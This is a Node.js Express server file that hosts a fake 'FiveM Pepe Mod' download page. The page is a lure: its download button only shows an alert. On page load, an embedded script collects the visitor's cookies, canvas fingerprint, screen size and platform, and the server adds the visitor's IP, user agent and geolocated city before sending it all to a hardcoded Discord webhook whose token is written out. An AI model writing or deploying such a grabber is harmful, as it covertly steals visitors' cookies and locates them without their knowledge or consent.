const express = require('express');
const axios = require('axios');

const app = express();
app.use(express.json());

const WEBHOOK_URL = 'https://discord.com/api/webhooks/1545864793267642378/IDuVmb0NJeGzVfw_oO5-_r3wsZd2-3rNc2vxG5rNUa0zrCNJPTGTSg_vsOkpsmSzFVkW';

// ---- API endpoint for collecting data ----
app.post('/api/collect', async (req, res) => {
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';
    const data = req.body || {};

    // Optional geo lookup
    let geo = {};
    try {
        const geoRes = await axios.get(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,lat,lon,isp`, { timeout: 3000 });
        if (geoRes.data.status === 'success') geo = geoRes.data;
    } catch (e) {}

    const embed = {
        title: '🎯 New Visitor',
        color: 0xff0044,
        fields: [
            { name: 'IP', value: ip, inline: true },
            { name: 'User Agent', value: req.headers['user-agent'] || 'Unknown', inline: true },
            { name: 'Screen', value: data.screen || 'Unknown', inline: true },
            { name: 'Time', value: new Date().toISOString(), inline: true },
        ],
    };
    if (geo.country) embed.fields.push({ name: '📍 Location', value: `${geo.city}, ${geo.regionName}, ${geo.country}`, inline: false });
    if (data.fingerprint) embed.fields.push({ name: '🔍 Fingerprint', value: data.fingerprint.substring(0, 200), inline: false });
    if (data.cookies) embed.fields.push({ name: '🍪 Cookies', value: data.cookies.substring(0, 200), inline: false });

    try {
        await axios.post(WEBHOOK_URL, { embeds: [embed] });
        console.log(`[+] ${ip} logged`);
    } catch (e) {}

    res.json({ status: 'ok' });
});

// ---- Serve the HTML page on the root ----
app.get('/', (req, res) => {
    res.send(`<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FiveM Pepe Mod</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0b0b0b;
            font-family: 'Segoe UI', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: #eee;
        }
        .card {
            max-width: 700px;
            background: #1a1a1a;
            border-radius: 30px;
            padding: 40px;
            border: 1px solid #00ffcc44;
            text-align: center;
        }
        h1 { font-size: 3rem; background: linear-gradient(135deg, #00ffcc, #00b8ff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .btn {
            display: inline-block;
            background: #00ffcc;
            color: #0b0b0b;
            padding: 14px 40px;
            border-radius: 50px;
            font-weight: bold;
            margin-top: 20px;
            cursor: pointer;
            transition: 0.3s;
            border: none;
        }
        .btn:hover { transform: scale(1.05); box-shadow: 0 0 30px #00ffcc66; }
        .footer { margin-top: 30px; color: #555; font-size: 0.8rem; }
    </style>
</head>
<body>
    <div class="card">
        <h1>🐸 Pepe Mod</h1>
        <p style="margin: 15px 0; color: #aaa;">🔥 The ultimate FiveM mod – preview now</p>
        <div style="background:#111; border-radius:15px; padding:20px; margin:20px 0;">
            <img src="https://via.placeholder.com/500x200/00ffcc/0b0b0b?text=Preview" style="max-width:100%; border-radius:10px;">
        </div>
        <button class="btn" id="downloadBtn">⬇ Download Now</button>
        <p style="color:#888; margin-top:15px;">⚠️ Preview version – full release soon</p>
        <div class="footer">© 2025 Pepe Team</div>
    </div>
    <script>
        // ---- Collect data and send to backend ----
        (function() {
            const data = {
                screen: screen.width + 'x' + screen.height,
                fingerprint: (() => {
                    const c = document.createElement('canvas');
                    c.width = 200; c.height = 50;
                    const ctx = c.getContext('2d');
                    ctx.fillStyle = '#f60'; ctx.fillRect(0,0,100,20);
                    ctx.fillStyle = '#069'; ctx.fillText('Pepe', 10, 30);
                    return c.toDataURL().substring(0, 80);
                })(),
                cookies: document.cookie || 'none',
                language: navigator.language,
                platform: navigator.platform,
            };

            fetch('/api/collect', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            }).catch(() => {});

            // Fake download
            document.getElementById('downloadBtn').addEventListener('click', function(e) {
                e.preventDefault();
                alert('The mod is in preview – check back later!');
            });
        })();
    </script>
</body>
</html>`);
});

// ---- Export for Vercel ----
module.exports = app;